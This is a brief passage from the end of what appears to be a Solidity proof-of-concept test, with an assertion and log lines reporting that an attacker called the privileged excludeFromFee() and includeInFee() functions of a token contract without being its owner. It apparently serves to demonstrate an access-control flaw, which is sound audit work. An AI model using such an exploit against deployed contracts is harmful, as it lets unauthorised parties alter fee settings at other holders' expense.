        require(!isExcludedFinal, "Attacker should NOT be excluded from fee after calling includeInFee");

        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker successfully called privileged functions excludeFromFee() and includeInFee() without being the owner!");
